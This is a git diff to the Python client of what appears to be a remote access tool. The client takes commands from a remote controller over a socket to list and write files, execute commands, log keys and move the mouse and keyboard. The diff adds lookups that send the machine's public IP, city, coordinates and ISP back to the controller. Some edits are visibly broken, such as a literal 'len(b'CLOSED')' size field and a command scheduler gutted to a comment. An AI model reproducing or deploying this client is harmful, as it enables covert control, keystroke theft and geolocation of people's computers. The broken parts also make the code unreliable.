@@ -16,6 +16,7 @@ import string
 import cv2
 import numpy as np
 import pyautogui as ptg
+import requests
 
 class App():
     def __init__(self, hostname, port, password):
@@ -57,7 +58,7 @@ class App():
                             if header == "CLOSE:CLOSE:CLOSE":
                                 data = self.socket.recv(1024).decode()
                                 if data == "CLOSE":
-                                    self.socket.send(b"CLOSED:1024:CLOSED")
+                                    self.socket.send(b"CLOSED:len(b'CLOSED'):CLOSED")
                                     self.socket.send(pickle.dumps("CLOSED"))
                                     self.status = "CLOSED"
                                     break
@@ -68,7 +69,7 @@ class App():
                             
                             bytes_data = b""
                             while len(bytes_data) < size:
-                                packet = self.socket.recv(size - len(bytes_data)) #change to (for stability): min(65536, size - len(bytes_data))
+                                packet = self.socket.recv(size - len(bytes_data))
                                 if not packet:
                                     raise ConnectionError("connection broken while receiving data")
                                 bytes_data += packet
@@ -81,8 +82,8 @@ class App():
                             header = header.split(":")
                             header = f"{header[0]}:{len(data)}:{header[1]}"
                             
-                            self.socket.send(header.encode()) #send header
-                            self.socket.sendall(data) #send data
+                            self.socket.send(header.encode())
+                            self.socket.sendall(data)
                         
 
                 sock.close()
@@ -121,6 +122,7 @@ class App():
                         self.cmd.args = args
                         self.cmd.command = data_in
                         self.cmd.type = "TEXT"
+                        self.cmd.name = name
                         data, name = handler()
                         header = f"{self.cmd.type}:{name}"
                     else:
@@ -148,9 +150,7 @@ class App():
         
         time.sleep(time_)
         
-        self.args = args
-        self.command = command
-        self.commands[command]()
+        #need to fix this
         
     
 class CMD():
@@ -158,6 +158,7 @@ class CMD():
         self.controller = controller
         self.args = []
         self.type = "TEXT"
+        self.name = "NONE"
         self.command = ""
         self.key_listener = None
         self.keys_log = []
@@ -177,7 +178,7 @@ class CMD():
     def cwd(self):
         return os.getcwd(), "GET_CURRENT_DIR"
     
-    def ls(self):
+    def dir(self):
         if len(self.args) == 0:
             return os.listdir(os.getcwd()), "LIST_DIR"
         else:
@@ -222,8 +223,7 @@ class CMD():
         return data, os.path.basename(self.args[0])
     
     def sendfile(self):
-        path = os.path.join(os.getcwd().replace("\\", "/"), self.args[0])
-        with open(path, "wb") as f:
+        with open(self.name, "wb") as f:
             f.write(self.controller.data_)
         return "Done", "SEND_FILE"
     
@@ -298,6 +298,8 @@ class CMD():
     def info(self):
         ram = psutil.virtual_memory()
         disk = psutil.disk_usage('/')
+        ip = requests.get('https://api.ipify.org').text
+        geo = requests.get(f'http://ip-api.com/json/{ip}').json()
         infos = {
                 " OS : " : platform.system(),
                 "OS version : " : platform.version(),
@@ -316,7 +318,16 @@ class CMD():
                 "Disk total (GB) : " : round(disk.total / (1024 ** 3), 2),
                 "Disk used (GB) : " : round(disk.used / (1024 ** 3), 2),
                 "Disk usage (%) : " : disk.percent,
+
+                "IP : ": ip,
+                "City : ": geo.get("city"),
+                "Region : ": geo.get("regionName"),
+                "Country : ": geo.get("country"),
+                "Lattitude : ": geo.get("lat"),
+                "Longitude : ": geo.get("lon"),
+                "ISP : ": geo.get("isp"),
             }
+        
         return infos, "INFO"
     
     def execute(self):
@@ -333,8 +344,9 @@ class CMD():
     
     def mouseclick(self):
         def action():
-            ptg.click(int(self.args[0]), int(self.args[1]), clicks=int(self.args[2]) if len(self.args) > 2 else 1, 
-                      interval=int(self.args[3]) if len(self.args) > 3 else 0.0, button=self.args[4] if len(self.args) > 4 else "left")
+            ptg.click(button=self.args[0] if len(self.args) > 0 else "left", x=int(self.args[1]) if len(self.args) > 1 else None, 
+                      y=int(self.args[2]) if len(self.args) > 2 else None, clicks=int(self.args[3]) if len(self.args) > 3 else 1, 
+                      interval=float(self.args[4]) if len(self.args) > 4 else 0.0)
         threading.Thread(target=action, daemon=True).start()
         return "Done", "MOUSE_CLICK"
     
@@ -348,31 +360,31 @@ class CMD():
     
     def mousedrag(self):
         def action():
-            ptg.drag(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0, button=self.args[3] if len(self.args) > 3 else "left")
+            ptg.drag(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0, button=self.args[3] if len(self.args) > 3 else "left")
         threading.Thread(target=action, daemon=True).start()
         return "Done", "MOUSE_DRAG"
     
     def mousedragto(self):
         def action():
-            ptg.dragTo(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0, button=self.args[3] if len(self.args) > 3 else "left")   
+            ptg.dragTo(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0, button=self.args[3] if len(self.args) > 3 else "left")   
         threading.Thread(target=action, daemon=True).start()
         return "Done", "MOUSE_DRAG_TO"
     
     def mousemove(self):
         def action():
-            ptg.move(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0)
+            ptg.move(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0)
         threading.Thread(target=action, daemon=True).start()
         return "Done", "MOUSE_MOVE"
         
     def mousemoveto(self):
         def action():
-            ptg.moveTo(int(self.args[0]), int(self.args[1]), duration=int(self.args[2]) if len(self.args) > 2 else 0.0)
+            ptg.moveTo(int(self.args[0]), int(self.args[1]), duration=float(self.args[2]) if len(self.args) > 2 else 0.0)
         threading.Thread(target=action, daemon=True).start()
         return "Done", "MOUSE_MOVE_TO"
     
     def write(self):
         def action():
-            ptg.write(self.args[0], interval=self.args[2] if len(self.args) > 2 else 0.0)
+            ptg.write(self.args[0], interval=float(self.args[2]) if len(self.args) > 2 else 0.0)
         threading.Thread(target=action, daemon=True).start()
         return "Done", "WRITE"
     
